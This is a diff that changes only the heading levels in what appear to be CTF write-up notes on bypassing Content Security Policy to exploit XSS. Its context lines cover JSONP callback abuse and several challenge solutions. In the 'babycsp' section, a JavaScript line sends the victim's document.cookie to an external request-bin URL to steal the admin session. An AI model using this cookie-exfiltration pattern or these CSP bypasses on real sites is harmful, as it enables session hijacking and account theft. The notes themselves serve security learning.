@@ -1,5 +1,5 @@
 
-## XSS
+# XSS
 
 Some notes about CSP:
 
@@ -19,7 +19,7 @@ Some notes about CSP:
 
 6. `'unsafe-eval'` allows the application to use the `eval()` JavaScript function. This reduces the protection against certain types of DOM-based XSS bugs, but makes it easier to adopt CSP. If your application doesn't use `eval()`, you can remove this keyword and have a safer policy. More on the `eval` function:
 
-### Recall: What is API callback and why are we using it?
+## Recall: What is API callback and why are we using it?
 
 From [Bypassing CSP by Abusing JSONP Endpoints | by Mazin Ahmed | Medium](https://medium.com/@mazin.ahmed/bypassing-csp-by-abusing-jsonp-endpoints-47cf453624d5):
 
@@ -33,7 +33,7 @@ as our callback? If no proper sanitization is done on the JSONP endpoint, it wil
 
 This is technically a correct JavaScript code! The syntax is correct as the rest of the response of commented out. JS engines would treat the data as a typical JavaScript code instead of a JSONP endpoint.
 
-### babycsp
+## babycsp
 
 Valid JSONP belonging to `*.google.com` that we can use:
 
@@ -45,7 +45,7 @@ Since the CSP of the website is:
 default-src 'self'; script-src 'self' *.google.com; connect-src *
 ```
 
-#### The exploit
+### The exploit
 
 We need a page that makes an HTTP req to reqbins, and that sends to it all the cookies. Then we use the XSS vulnerability on the website of the challenge to make the admin visit that webpage, and we should be all set. More specifically those are the steps to follow:
 
@@ -66,7 +66,7 @@ window.location.href = ''.concat('""" + HOOK + """?c=', document.cookie);
 
 Where `HOOK` is the url of the request bin. Putting that in a post and sending it to the admin will allow us to send the session cookie of the admin, which contains the flag, to our bin embedded as request parameter.
 
-### csp
+## csp
 
 ```javascript
 Content-Security-Policy: default-src https://www.google.com https://ajax.googleapis.com 'unsafe-eval'; style-src 'self' https://maxcdn.bootstrapcdn.com/bootstrap/; font-src 'self' https://maxcdn.bootstrapcdn.com/bootstrap/;object-src 'none'
@@ -88,7 +88,7 @@ This is what gets printed:
 
 Which means that we only have `; ! - = {} ()`. Still, we have a vulnerability. In fact there's a specific field, which is the one that is used to add participant names to the event, which is not escaped. As such we can use it to carry our exploit.
 
-#### First approach
+### First approach
 
 Now that we have some attack surface, I started trying some exploits.
 
@@ -121,7 +121,7 @@ Now that we have some attack surface, I started trying some exploits.
   alert1337({})
   ```
 
-#### Solution
+### Solution
 
 A bit disappointing, since I solved this with random code found on the internet. From [CSP - Pentest Book (six2dez.com)](https://pentestbook.six2dez.com/enumeration/web/csp):
 
@@ -131,7 +131,7 @@ A bit disappointing, since I solved this with random code found on the internet.
 
 **Note**: the payload must be at most 255 characters long!
 
-### strict-csp
+## strict-csp
 
 ```javascript
 Content-Security-Policy: default-src 'self'; script-src 'strict-dynamic' 'nonce-Iyt3N79hSx'; style-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/; font-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/;object-src 'none'
